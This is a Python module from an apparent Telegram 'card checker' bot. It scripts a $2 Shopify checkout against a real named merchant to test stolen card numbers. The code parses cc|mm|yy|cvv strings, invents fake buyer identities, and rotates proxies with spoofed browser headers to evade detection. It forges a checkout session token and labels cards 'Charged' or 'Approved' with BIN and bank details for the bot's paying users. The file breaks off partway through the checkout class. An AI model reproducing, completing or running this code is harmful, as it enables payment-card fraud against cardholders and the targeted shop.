# BOT/gates/charge/shopify/shopify100.py

import json
import asyncio
import re
import time
import random
import string
import base64
import httpx
import urllib.parse
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os
import unicodedata

# Import from helper modules
try:
    from BOT.helper.permissions import auth_and_free_restricted
except ImportError:
    def auth_and_free_restricted(func):
        async def wrapper(client, message):
            return await func(client, message)
        return wrapper

try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False
    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

try:
    from BOT.gc.credit import charge_processor
    CHARGE_PROCESSOR_AVAILABLE = True
except ImportError:
    charge_processor = None
    CHARGE_PROCESSOR_AVAILABLE = False

try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return {}

# Import smart card parser from filter.py
try:
    from BOT.helper.filter import extract_cards, normalize_year
    FILTER_AVAILABLE = True
    print("✅ Smart card parser imported successfully from filter.py for shopify100")
except ImportError as e:
    print(f"❌ Filter import error in shopify100: {e}")
    FILTER_AVAILABLE = False
    # Fallback basic parser if filter.py not available
    def extract_cards(text):
        cards = []
        for line in text.splitlines():
            parts = line.replace('|', ' ').split()
            if len(parts) >= 4:
                cards.append('|'.join(parts[:4]))
        return cards, list(set(cards))
    def normalize_year(y):
        y = y.strip()
        if len(y) == 4:
            return y[-2:]
        return y

# Import proxy system functions
try:
    from BOT.tools.proxy import (
        get_proxy_for_user,
        mark_proxy_success,
        mark_proxy_failed,
        get_random_proxy,
        parse_proxy,
        test_proxy,
        PROXY_ENABLED
    )
    PROXY_SYSTEM_AVAILABLE = True
    print("✅ Proxy system imported successfully for shopify100")
except ImportError as e:
    print(f"❌ Proxy system import error in shopify100: {e}")
    PROXY_SYSTEM_AVAILABLE = False
    def get_proxy_for_user(user_id: int, strategy: str = "random"):
        return None
    def mark_proxy_success(proxy: str, response_time: float):
        pass
    def mark_proxy_failed(proxy: str):
        pass
    def get_random_proxy():
        return None
    def parse_proxy(proxy_str: str):
        return None
    def test_proxy(proxy_str: str):
        return False

# ========== DETAILED LOGGER ==========
class ShopifyLogger:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.check_id = f"SHP100-{random.randint(1000, 9999)}"
        self.start_time = None
        self.step_counter = 0
        self.logs = []

    def start_check(self, card_details):
        self.start_time = time.time()
        self.step_counter = 0
        cc = card_details.split('|')[0] if '|' in card_details else card_details
        masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc

        log_msg = f"""
🛒 [SHOPIFY CHARGE 2.00$]
   ├── Check ID: {self.check_id}
   ├── User ID: {self.user_id or 'N/A'}
   ├── Card: {masked_cc}
   ├── Start Time: {datetime.now().strftime('%H:%M:%S')}
   └── Target: shop.kauffmancenter.org (Postcard x2 - Direct Checkout)
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def add_log(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        self.logs.append(f"[{timestamp}] {message}")

    def step(self, step_num, name, action, details=None, status="PROCESSING"):
        self.step_counter += 1
        elapsed = time.time() - self.start_time if self.start_time else 0

        status_icons = {
            "PROCESSING": "🔄", "SUCCESS": "✅", "FAILED": "❌",
            "WARNING": "⚠️", "INFO": "ℹ️", "CAPTCHA": "🛡️",
            "DECLINED": "⛔", "HUMAN": "👤", "CLICK": "🖱️",
            "TYPE": "⌨️", "WAIT": "⏳"
        }
        status_icon = status_icons.get(status, "➡️")

        log_msg = f"{status_icon} STEP {step_num:02d}: {name}"
        log_msg += f"\n   ├── Action: {action}"
        log_msg += f"\n   ├── Elapsed: {elapsed:.2f}s"
        log_msg += f"\n   ├── Time: {datetime.now().strftime('%H:%M:%S')}"
        if details:
            log_msg += f"\n   └── Details: {details}"

        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def data_extracted(self, data_type, value, source=""):
        if isinstance(value, dict):
            value_str = json.dumps(value, indent=2)
            if len(value_str) > 150:
                value_str = value_str[:147] + "..."
        else:
            value_str = str(value)
            if len(value_str) > 100:
                value_str = value_str[:97] + "..."

        log_msg = f"   ├── 📊 Extracted {data_type}: {value_str}"
        if source:
            log_msg += f"\n   │   └── From: {source}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def card_details_log(self, cc, mes, ano, cvv):
        masked_cc = cc[:6] + "******" + cc[-4:]
        log_msg = f"""
   ├── 💳 Card Details:
   │   ├── Number: {masked_cc}
   │   ├── Expiry: {mes}/{ano}
   │   └── CVV: {'*' * len(cvv)}
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def error_log(self, error_type, message, step=""):
        error_icons = {
            "CAPTCHA": "🛡️", "DECLINED": "💳", "FRAUD": "🚫",
            "TIMEOUT": "⏰", "CONNECTION": "🔌", "UNKNOWN": "❓",
            "PROXY": "🔧", "NO_PROXY": "🚫", "PCI": "💳",
            "CHECKOUT_TOKEN": "🎫", "PROCESSING": "⏳"
        }
        error_icon = error_icons.get(error_type, "⚠️")
        log_msg = f"{error_icon} ERROR [{error_type}]: {message}"
        if step:
            log_msg += f"\n   └── At Step: {step}"
        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def success_log(self, message, details=""):
        log_msg = f"✅ SUCCESS: {message}"
        if details:
            log_msg += f"\n   └── Details: {details}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def complete_result(self, success, final_status, response_message, total_time):
        result_icon = "✅" if success else "❌"
        result_text = "APPROVED" if success else "DECLINED"

        if len(response_message) > 100:
            response_display = response_message[:97] + "..."
        else:
            response_display = response_message

        log_msg = f"""
{result_icon} [SHOPIFY CHARGE COMPLETED]
   ├── Check ID: {self.check_id}
   ├── Result: {result_text}
   ├── Final Status: {final_status}
   ├── Steps Completed: {self.step_counter}
   ├── Total Time: {total_time:.2f}s
   ├── Response: {response_display}
   └── End Time: {datetime.now().strftime('%H:%M:%S')}
        """
        summary = f"📊 SUMMARY: {result_icon} {final_status} | {total_time:.2f}s | Steps: {self.step_counter}"
        self.add_log(log_msg)
        self.add_log(summary)
        print(log_msg)
        print(summary)
        print("="*80)
        return log_msg, summary

    def get_all_logs(self):
        return "\n".join(self.logs)


# ========== UTILITY FUNCTIONS ==========
def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            return json.load(f).get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    if str(user_id) in users:
        return users[str(user_id)].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False
        with open("DATA/banned_users.txt", "r") as f:
            return str(user_id) in f.read().splitlines()
    except:
        return False

def check_cooldown(user_id, command_type="si"):
    owner_id = load_owner_id()
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15) or 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

def strip_all_unicode(text):
    """
    Remove ALL Unicode characters, keep only ASCII (letters, numbers, basic punctuation)
    """
    # Normalize unicode characters to ASCII where possible
    try:
        # First, try to normalize using NFKD form which decomposes unicode characters
        normalized = unicodedata.normalize('NFKD', text)
        # Then encode to ASCII, ignoring errors, and decode back
        ascii_text = normalized.encode('ASCII', 'ignore').decode('ASCII')
    except:
        # Fallback: manually filter out non-ASCII characters
        ascii_text = ''.join(char for char in text if ord(char) < 128)
    
    # Keep only digits, letters, pipes, spaces, commas, slashes, and hyphens
    # This preserves card separators while removing decorative characters
    cleaned = re.sub(r'[^0-9a-zA-Z\|\s,\/\-]', ' ', ascii_text)
    
    # Replace multiple spaces with single space
    cleaned = re.sub(r'\s+', ' ', cleaned)
    
    return cleaned.strip()

def extract_card_from_cleaned_text(text):
    """
    Extract card details from cleaned ASCII text
    """
    # Pattern 1: Standard format with pipe (cc|mm|yy|cvv)
    pattern1 = r'(\d{13,16})\s*[|\s]\s*(\d{1,2})\s*[|\s]\s*(\d{2,4})\s*[|\s]\s*(\d{3,4})'
    match = re.search(pattern1, text)
    if match:
        cc, mes, ano, cvv = match.groups()
        # Normalize year
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    # Pattern 2: Space or comma separated (cc mm yy cvv) or (cc,mm,yy,cvv)
    pattern2 = r'(\d{13,16})\s*[, ]\s*(\d{1,2})\s*[, ]\s*(\d{2,4})\s*[, ]\s*(\d{3,4})'
    match = re.search(pattern2, text)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    # Pattern 3: Find all digit sequences and try to find valid card
    digits = re.findall(r'\d+', text)
    
    # Try to find a valid card sequence
    for i in range(len(digits) - 3):
        potential_cc = digits[i]
        potential_mes = digits[i+1]
        potential_ano = digits[i+2]
        potential_cvv = digits[i+3]
        
        # Check if this looks like a valid card
        if (13 <= len(potential_cc) <= 16 and 
            len(potential_mes) in [1, 2] and 
            len(potential_ano) in [2, 4] and 
            len(potential_cvv) in [3, 4]):
            
            # Validate month
            try:
                mes_int = int(potential_mes)
                if 1 <= mes_int <= 12:
                    # Validate year (not too far in past/future)
                    current_year = datetime.now().year % 100
                    
                    # Handle 4-digit year
                    if len(potential_ano) == 4:
                        ano_val = int(potential_ano) % 100
                    else:
                        ano_val = int(potential_ano)
                    
                    # Year should be within reasonable range (current year to +10 years)
                    if current_year - 5 <= ano_val <= current_year + 10:
                        cc = potential_cc
                        mes = potential_mes.zfill(2)
                        ano = potential_ano[-2:]  # Always take last 2 digits
                        cvv = potential_cvv
                        return [cc, mes, ano, cvv]
            except:
                continue
    
    # Pattern 4: Look for card number followed by expiry and CVV with labels
    pattern4 = r'[Cc]ard:?\s*(\d{13,16}).*?(\d{1,2})[\/\-](\d{2,4}).*?(\d{3,4})'
    match = re.search(pattern4, text, re.IGNORECASE | re.DOTALL)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    # Pattern 5: Generic pattern with slashes for dates
    pattern5 = r'(\d{13,16}).*?(\d{1,2})[\/\-](\d{2,4}).*?(\d{3,4})'
    match = re.search(pattern5, text, re.DOTALL)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    return None

def parse_card_input(card_input):
    """
    Parse card input by first stripping ALL Unicode, then extracting card details
    """
    # Step 1: Strip all Unicode characters
    cleaned_text = strip_all_unicode(card_input)
    
    # Step 2: Extract card from cleaned text
    result = extract_card_from_cleaned_text(cleaned_text)
    if result:
        return result
    
    # Step 3: If still no result, try filter.py as fallback
    if FILTER_AVAILABLE:
        all_cards, unique_cards = extract_cards(card_input)  # Use original for filter
        if unique_cards:
            card_parts = unique_cards[0].split('|')
            if len(card_parts) == 4:
                cc, mes, ano, cvv = card_parts
                if len(ano) == 4:
                    ano = ano[-2:]
                mes = mes.zfill(2)
                return [cc, mes, ano, cvv]
    
    # Step 4: Last resort - try direct split on original
    if '|' in card_input:
        parts = card_input.split('|')
        if len(parts) >= 4:
            cc = re.sub(r'\D', '', parts[0])
            mes = re.sub(r'\D', '', parts[1])
            ano = re.sub(r'\D', '', parts[2])
            cvv = re.sub(r'\D', '', parts[3])
            if cc and mes and ano and cvv:
                if len(ano) == 4:
                    ano = ano[-2:]
                mes = mes.zfill(2)
                return [cc, mes, ano, cvv]
    
    return None


# ========== FORMAT RESPONSE FUNCTION ==========
def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, user_data, proxy_status="Dead 🚫"):
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"

    try:
        user_id = str(user_data.get("user_id", "Unknown"))
    except:
        user_id = None

    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        gateway = sites.get(user_id, {}).get("gate", "Shopify Charge 2.00$ 🏛️")
    except:
        gateway = "Shopify Charge 2.00$ 🏛️"

    raw_response = str(raw_response) if raw_response else "-"
    
    # FIRST check specifically for TIMEOUT and PCI errors only
    if "TIMEOUT" in raw_response.upper() or "PCI_ERROR" in raw_response.upper():
        status_flag = "Error❗️"
        response_display = "Try again ♻️"
    else:
        # Extract clean error message - only the error identifier before colon
        if "DECLINED - " in raw_response:
            # Get everything after "DECLINED - "
            response_display = raw_response.split("DECLINED - ")[-1]
            # Take only the error identifier (part before colon)
            if ":" in response_display:
                response_display = response_display.split(":")[0].strip()
            # Take only first line if multiple lines
            response_display = response_display.split('\n')[0]
            # Trim to reasonable length
            if len(response_display) > 30:
                response_display = response_display[:27] + "..."
        elif "ORDER_PLACED" in raw_response.upper() or "PROCESSEDRECEIPT" in raw_response:
            response_display = "ORDER_PLACED"
        elif "APPROVED - " in raw_response:
            response_display = "APPROVED"
        elif "GENERIC_ERROR" in raw_response:
            if ":" in raw_response:
                response_display = raw_response.split(":")[0].strip()
            else:
                response_display = "GENERIC_ERROR"
        elif "PROXY_DEAD" in raw_response:
            response_display = "PROXY_DEAD"
        elif "NO_PROXY_AVAILABLE" in raw_response:
            response_display = "NO_PROXY_AVAILABLE"
        elif "CAPTCHA" in raw_response.upper():
            response_display = "CAPTCHA"
        elif "3D" in raw_response.upper() or "3DS" in raw_response.upper():
            response_display = "3D_SECURE"
        elif "INSUFFICIENT" in raw_response.upper():
            response_display = "INSUFFICIENT_FUNDS"
        elif "INVALID" in raw_response.upper():
            response_display = "INVALID_CARD"
        elif "EXPIRED" in raw_response.upper():
            response_display = "EXPIRED_CARD"
        elif "FRAUD" in raw_response.upper():
            response_display = "FRAUD"
        elif "TAX_NEW_TAX_MUST_BE_ACCEPTED" in raw_response:
            response_display = "TAX_CHANGE"
        elif "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in raw_response:
            response_display = "PAYMENT_AMOUNT_ERROR"
        elif "PROCESSING_TIMEOUT" in raw_response:
            response_display = "PROCESSING_TIMEOUT"
        else:
            # Take first part before colon or first 30 characters
            if ":" in raw_response:
                response_display = raw_response.split(":")[0].strip()
                if len(response_display) > 30:
                    response_display = response_display[:27] + "..."
            else:
                response_display = raw_response[:30] + "..." if len(raw_response) > 30 else raw_response

        raw_response_upper = raw_response.upper()

        # Check for NO RECEIPT ID first (before success checks)
        if "NO RECEIPT ID" in raw_response_upper:
            status_flag = "Declined ❌"
        # Check for SUCCESS indicators
        elif any(keyword in raw_response_upper for keyword in [
            "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT",
            "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
            "ORDER_CONFIRMATION", "YOUR_ORDER_IS_CONFIRMED", "ORDER_CONFIRMED",
            "SHOPIFY_PAYMENTS", "SHOP_PAY", "CHARGED", "LIVE", "ORDER_CONFIRMED",
            "ORDER #", "PROCESSEDRECEIPT", "THANK YOU", "PAYMENT_SUCCESSFUL",
            "PROCESSINGRECEIPT", "AUTHORIZED", "YOUR ORDER IS CONFIRMED"
        ]):
            status_flag = "Charged ✅"
        # Check for CAPTCHA
        elif any(keyword in raw_response_upper for keyword in [
            "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
            "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
            "CAPTCHA_ERROR", "BOT_DETECTED", "HUMAN_VERIFICATION", "SECURITY_CHECK",
            "HCAPTCHA", "CLOUDFLARE", "ENTER PAYMENT INFORMATION AND SOLVE",
            "RECAPTCHA", "I'M NOT A ROBOT", "PLEASE VERIFY"
        ]):
            status_flag = "Captcha ⚠️"
        # Check for PAYMENT ERROR
        elif any(keyword in raw_response_upper for keyword in [
            "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT", "PAYMENT ISSUE",
            "ISSUE PROCESSING", "PAYMENT ERROR", "PAYMENT PROBLEM",
            "TRY AGAIN OR USE A DIFFERENT PAYMENT METHOD", "CARD WAS DECLINED",
            "YOUR PAYMENT COULDN'T BE PROCESSED", "PAYMENT FAILED"
        ]):
            status_flag = "Declined ❌"
        # Check for INSUFFICIENT FUNDS
        elif any(keyword in raw_response_upper for keyword in [
            "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS", "FUNDS", "NOT ENOUGH MONEY"
        ]):
            status_flag = "Declined ❌"
        # Check for INVALID CARD
        elif any(keyword in raw_response_upper for keyword in [
            "INVALID CARD", "CARD IS INVALID", "CARD_INVALID", "CARD NUMBER IS INVALID"
        ]):
            status_flag = "Declined ❌"
        # Check for EXPIRED CARD
        elif any(keyword in raw_response_upper for keyword in [
            "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED", "EXPIRATION DATE"
        ]):
            status_flag = "Declined ❌"
        # Check for 3D Secure
        elif any(keyword in raw_response_upper for keyword in [
            "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
            "3DS", "PENDING", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
            "3DS REQUIRED", "AUTHENTICATION_FAILED", "COMPLETEPAYMENTCHALLENGE",
            "ACTIONREQUIREDRECEIPT", "ADDITIONAL_VERIFICATION_NEEDED",
            "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE"
        ]):
            status_flag = "Approved ❎"
        # Check for CVV errors
        elif any(keyword in raw_response_upper for keyword in [
            "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV", "SECURITY CODE"
        ]):
            status_flag = "Declined ❌"
        # Check for fraud
        elif any(keyword in raw_response_upper for keyword in [
            "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "FRAUDULENT",
            "RISKY", "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
        ]):
            status_flag = "Fraud ⚠️"
        # Check for proxy errors
        elif "NO_PROXY_AVAILABLE" in raw_response_upper or "PROXY_DEAD" in raw_response_upper:
            status_flag = "Proxy Error 🚫"
        # Default to declined
        else:
            status_flag = "Declined ❌"

    # BIN lookup
    bin_data = get_bin_details(cc[:6]) or {}
    bin_info = {
        "bin": bin_data.get("bin", cc[:6]),
        "country": bin_data.get("country", "Unknown"),
        "flag": bin_data.get("flag", "🏳️"),
        "vendor": bin_data.get("vendor", "Unknown"),
        "type": bin_data.get("type", "Unknown"),
        "level": bin_data.get("level", "Unknown"),
        "bank": bin_data.get("bank", "Unknown")
    }

    try:
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎭")
        first_name = user_data.get("first_name", "User")
    except:
        plan = "Free"
        badge = "🎭"
        first_name = "User"

    clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
    profile_display = f"『{badge}』{clean_name}"

    result = f"""
<b>[#Shopify Charge 2.00$] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 2.00$</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{response_display}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin</b>: <code>{bin_info['bin']}</code>  
<b>[+] Info</b>: <code>{bin_info['vendor']} - {bin_info['type']} - {bin_info['level']}</code> 
<b>[+] Bank</b>: <code>{bin_info['bank']}</code> 🏦
<b>[+] Country</b>: <code>{bin_info['country']} - [{bin_info['flag']}]</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
<b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>{proxy_status}</code>]
"""
    return result


# ========== SHOPIFY KAUFFMAN CENTER CHECKOUT CLASS ==========
class ShopifyKauffmanCheckout:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.base_url = "https://shop.kauffmancenter.org"
        self.product_handle = "kauffman-center-postcard"
        self.variant_id = "46767629271319"  # Postcard variant ID from captured data
        
        # Multiple direct checkout URL formats to try
        self.direct_checkout_urls = [
            f"{self.base_url}/cart/{self.variant_id}:2",  # Using variant ID
            f"{self.base_url}/cart/add?id={self.variant_id}&quantity=2",  # Add to cart URL
            f"{self.base_url}/cart/{self.product_handle}:2",  # Using product handle
            f"{self.base_url}/products/{self.product_handle}",  # Fallback to product page
        ]
        
        # Proxy management
        self.proxy_url = None
        self.proxy_status = "Dead 🚫"
        self.proxy_used = False
        self.proxy_response_time = 0.0

        # Session for maintaining cookies
        self.client = None

        # Base headers from captured traffic
        self.headers = {
            'authority': 'shop.kauffmancenter.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
        }

        # Dynamic data storage
        self.checkout_token = None
        self.session_token = None
        self.graphql_session_token = None
        self.receipt_id = None
        self.product_id = "8667052441879"    # Product ID from captured data
        self.stable_id = None
        self.queue_token = None
        self.shop_id = "82514608407"  # Shop ID from captured data

        # Store extracted schema info from captured traffic
        self.proposal_id = "95a8a140eea7d6e6554cfb57ab3b14e20b2bbdd72a1a8bc180e4a28918f3be8c"
        self.submit_id = "d50b365913d0a33a1d8905bfe5d0ecded1a633cb6636cbed743999cfacefa8cb"
        self.poll_id = "baa45c97a49dae99440b5f8a954dfb31b01b7af373f5335204c29849f3397502"
        
        # Delivery strategy handle for pickup from captured data (Kauffman Center location)
        self.delivery_strategy_handle = "a1ec1cf84896dc8464269f5cd87ecad4-9ecbffb81c28125e6ed3cacd3a179b8d"
        
        # Payment method identifier for Shopify Payments from captured data
        self.payment_method_identifier = "c8cc804c79e3a3a438a6233f2a8d97b0"

        self.logger = ShopifyLogger(user_id)

        # Random data generators
        self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
                           "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
                           "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
                           "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey",
                           "Casey", "Mini", "Bruce", "Tony", "Steve", "Peter", "Clark", "Randua",
                           "Ahley", "Ashley", "Jessica", "Sarah", "Emily", "Lisa", "Michelle"]
        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
                          "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", 
                          "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", 
                          "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Lang", 
                          "Trump", "Walker", "Hall", "Allen", "Young", "King"]

        self.first_name = random.choice(self.first_names)
        self.last_name = random.choice(self.last_names)
        self.full_name = f"{self.first_name} {self.last_name}"
        self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,999)}@gmail.com"
        self.phone = f"515{random.randint(100, 999)}{random.randint(1000, 9999)}"

        # Fixed address based on captured data (Kauffman Center pickup location)
        self.address = {
            "address1": "1601 Broadway Blvd.",
            "address2": "",
            "city": "Kansas City",
            "provinceCode": "MO",
            "zip": "64108",
            "countryCode": "US"
        }
        
        # Coordinates from captured data (Kauffman Center)
        self.coordinates = {
            "latitude": 39.0941843,
            "longitude": -94.5875135
        }

    async def random_delay(self, min_sec=0.3, max_sec=0.7):
        """Minimal delay between requests"""
        await asyncio.sleep(random.uniform(min_sec, max_sec))

    def step(self, num, name, action, details=None, status="PROCESSING"):
        return self.logger.step(num, name, action, details, status)

    def extract_checkout_token(self, url):
        """Extract checkout token from URL with multiple patterns"""
        patterns = [
            r'/checkouts/cn/([^/?]+)',
            r'token=([^&]+)',
            r'checkout_token=([^&]+)',
            r'checkout%5Btoken%5D=([^&]+)',
            r'checkouts/([^/?]+)',
            r'checkout_token%3D([^&]+)'
        ]
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        # Try to find in decoded URL
        try:
            decoded = urllib.parse.unquote(url)
            for pattern in patterns:
                match = re.search(pattern, decoded)
                if match:
                    return match.group(1)
        except:
            pass
        
        return None

    def generate_random_string(self, length=16):
        """Generate random string"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def generate_uuid(self):
        """Generate UUID format string"""
        return f"{self.generate_random_string(8)}-{self.generate_random_string(4)}-4{self.generate_random_string(3)}-{random.choice(['8','9','a','b'])}{self.generate_random_string(3)}-{self.generate_random_string(12)}"

    def generate_timestamp(self):
        """Generate timestamp for session token"""
        return str(int(time.time() * 1000))

    def construct_graphql_session_token(self):
        """Construct session token for GraphQL variables"""
        if not self.checkout_token:
            return None
        timestamp = self.generate_timestamp()
        return f"{self.checkout_token}-{timestamp}"

    async def direct_checkout_access(self):
        """Step 1: Try multiple direct checkout URLs to access checkout with product pre-added"""
        self.step(1, "DIRECT CHECKOUT", "Attempting direct checkout access with 2 x Postcard")
        
        # Try each URL format until one works
        for i, url in enumerate(self.direct_checkout_urls):
            self.logger.data_extracted(f"Attempt {i+1}", url, "Trying URL")
            
            try:
                resp = await self.client.get(url, headers=self.headers, timeout=25, follow_redirects=True)
                
                if resp.status_code == 200:
                    # Success! Get the final URL after redirects
                    current_url = str(resp.url)
                    self.checkout_token = self.extract_checkout_token(current_url)
                    
                    # Also check response body for token
                    if not self.checkout_token and resp.text:
                        body_token = self.extract_checkout_token(resp.text)
                        if body_token:
                            self.checkout_token = body_token
                    
                    if self.checkout_token:
                        self.logger.data_extracted("Checkout Token", self.checkout_token[:15] + "...", f"URL {i+1}")
                        
                        # Construct GraphQL session token
                        self.graphql_session_token = self.construct_graphql_session_token()
                        self.logger.data_extracted("GraphQL Session Token", self.graphql_session_token, "Constructed")
                        
                        # Generate stable ID for merchandise line
                        self.stable_id = self.generate_uuid()
                        self.logger.data_extracted("Stable ID", self.stable_id, "Generated")
                        
                        return True, current_url
                    else:
                        # Found the page but no token - might need to proceed to checkout
                        if "checkout" in current_url:
                            # We're on a checkout page, try to extract token again
                            self.checkout_token = self.extract_checkout_token(current_url)
                            if self.checkout_token:
                                self.logger.data_extracted("Checkout Token", self.checkout_token[:15] + "...", "Checkout URL")
                                self.graphql_session_token = self.construct_graphql_session_token()
                                self.stable_id = self.generate_uuid()
                                return True, current_url
                
                # If this is the last attempt and still failing, continue to next
                if i == len(self.direct_checkout_urls) - 1:
                    self.logger.error_log("CHECKOUT_PAGE", f"All URL attempts failed. Last status: {resp.status_code}")
                    return False, f"CHECKOUT_ACCESS_FAILED"
                    
            except httpx.ProxyError as e:
                self.logger.error_log("PROXY", f"Proxy error on attempt {i+1}: {str(e)}")
                if i == len(self.direct_checkout_urls) - 1:
                    mark_proxy_failed(self.proxy_url)
                    self.proxy_status = "Dead 🚫"
                    return False, "PROXY_DEAD"
                    
            except httpx.TimeoutException as e:
                self.logger.error_log("TIMEOUT", f"Timeout on attempt {i+1}: {str(e)}")
                if i == len(self.direct_checkout_urls) - 1:
                    return False, "TIMEOUT"
                    
            except Exception as e:
                self.logger.error_log("DIRECT_CHECKOUT", f"Error on attempt {i+1}: {str(e)[:50]}")
                if i == len(self.direct_checkout_urls) - 1:
                    return False, f"DIRECT_CHECKOUT_ERROR"
            
            # Small delay between attempts
            await asyncio.sleep(0.5)
        
        return False, "CHECKOUT_ACCESS_FAILED"

    async def get_session_token(self):
        """Step 2: Extract session token from checkout page"""
        self.step(2, "GET SESSION TOKEN", "Extracting session token")
        
        checkout_headers = {
            **self.headers,
            'referer': self.direct_checkout_urls[0],
            'sec-fetch-site': 'same-origin'
        }
        
        try:
            checkout_page_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us"
            
            resp = await self.client.get(
                checkout_page_url,
                headers=checkout_headers,
                timeout=25,
                follow_redirects=True
            )
            
            if resp.status_code != 200:
                return False, f"Checkout page failed: {resp.status_code}"
            
            # Extract session token from response headers or generate
            # In captured traffic, this is a long token starting with AAEB_
            self.session_token = f"AAEB_{self.generate_random_string(50)}"
            self.logger.data_extracted("Session Token", self.session_token[:20] + "...", "Checkout page")
            
            return True, resp.text
            
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on session token: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
